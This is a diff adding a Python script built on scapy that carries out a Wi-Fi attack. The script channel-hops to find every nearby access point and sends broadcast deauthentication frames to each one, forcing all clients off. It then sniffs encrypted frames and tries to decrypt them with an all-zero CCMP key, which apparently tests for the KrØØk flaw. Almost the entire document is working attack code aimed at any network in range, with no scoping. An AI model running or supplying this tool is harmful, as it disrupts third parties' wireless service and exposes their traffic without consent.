@@ -1,0 +1,115 @@
+import threading, os, time, random
+from scapy.all import *
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
+import libwifi
+from libwifi import *
+
+interface = "wlp0s20f0u1mon"
+
+class ChannelHopper:
+    def __init__(self):
+        self._running = True
+
+    def terminate(self):
+        self._running = False
+
+    def hopper(self, iface):
+        n = 1
+        while self._running:
+            time.sleep(0.50)
+            os.system('iwconfig %s channel %d' % (iface, n))
+            dig = int(random.random() * 14)
+            if dig != 0 and dig != n:
+                n = dig
+
+def channelChange(iface, channel):
+    os.system('iwconfig %s channel %d' % (iface, channel))
+
+APs = {}
+Clients = {}
+def pkt_callback(pkt):
+    channel = 0
+    if pkt.haslayer(Dot11Beacon):
+        bss = pkt.getlayer(Dot11).addr2.upper()
+        if(pkt.getlayer(Dot11Beacon).network_stats()):
+            channel = pkt.getlayer(Dot11Beacon).network_stats()['channel']
+        if not APs.has_key(bss):
+            APs[bss] = channel
+    elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2L and not pkt.haslayer(EAPOL):
+        # This means it's data frame.
+        sn = pkt.getlayer(Dot11).addr2.upper()
+        rc = pkt.getlayer(Dot11).addr1.upper()
+
+        if sn in APs:
+            if not Clients.has_key(sn):
+                Clients[sn] = rc
+            print "AP (%s) > STA (%s)" % (sn, rc)
+        elif rc in APs:
+            if not Clients.has_key(rc):
+                Clients[rc] = sn
+            print "AP (%s) < STA (%s)" % (rc, sn)
+
+F_bssids = {}    # Found BSSIDs
+def findSSID(pkt):
+    channel = 0
+    if (pkt.haslayer(Dot11Beacon)):
+        mac_addr = str(pkt.getlayer(Dot11).addr2).strip()
+        if(mac_addr and not F_bssids.has_key(mac_addr)):
+            ssid = pkt.getlayer(Dot11Elt).info
+            if(ssid == '' or pkt.getlayer(Dot11Elt).ID != 0):
+                print("Hidden Network Detected")
+            else:
+                if(pkt.getlayer(Dot11Beacon).network_stats()):
+                    channel = pkt.getlayer(Dot11Beacon).network_stats()['channel']
+                F_bssids[mac_addr] = channel
+                print("Network Detected: %s - %s" % (ssid.decode('utf-8'), mac_addr))
+
+def checkEncrypt(pkt):
+	if(dot11_is_encrypted_data(pkt)):
+            print("Data: %s\n" %(decrypt_ccmp(pkt, "\x00" * 16)))
+            if(decrypt_ccmp(pkt, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00")):
+                print("-------- DATA DECRYPTED ----------\n")
+                print("Data: %s" %(decrypt_ccmp(pkt, "\x00" * 16)))
+                pkt.show()
+                print("----------------------------------\n")
+
+def deauth(ap, client):
+    # Deauthentication Packet For Access Point
+    pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+    print("Deauth to: %s" %(ap))
+    sendp(pkt, iface=interface)
+
+def main():
+    #Start channel hopping
+    c = ChannelHopper()
+    thread = threading.Thread(target=c.hopper, args=(interface, ), name="hopper")
+    #thread.daemon = True
+    thread.start()
+
+    #Obtain the essid of the aps
+    print("Obtaining the ssid of the AP's, yummi ssid!!\n")
+    sniff(iface=interface, prn=findSSID, count=500)
+    print("\n")
+
+    #Stop channel hopping
+    c.terminate()
+    thread.join()
+
+    #For every essid deauth and capture data
+    print("---------------> Checking vulns!! <-------------\n")
+    for essid,channel in F_bssids.iteritems():
+        deauth(essid, "FF:FF:FF:FF:FF:FF")
+        print("Decrypting data for: %s" %(essid))
+        #Change channel
+        channelChange(interface, channel)
+        sniff(iface=interface, prn=checkEncrypt, count=5, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
+        #sniff(iface=interface, prn=checkEncrypt, count=5, filter="ether host " + essid, timeout=2, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
+        #sniff(iface=interface, prn=checkEncrypt, count=5, lfilter=lambda pkt: (pkt.host==essid))
+
+
+if __name__=='__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("Interrupted by user!! F*** **u!")
+        exit(0)
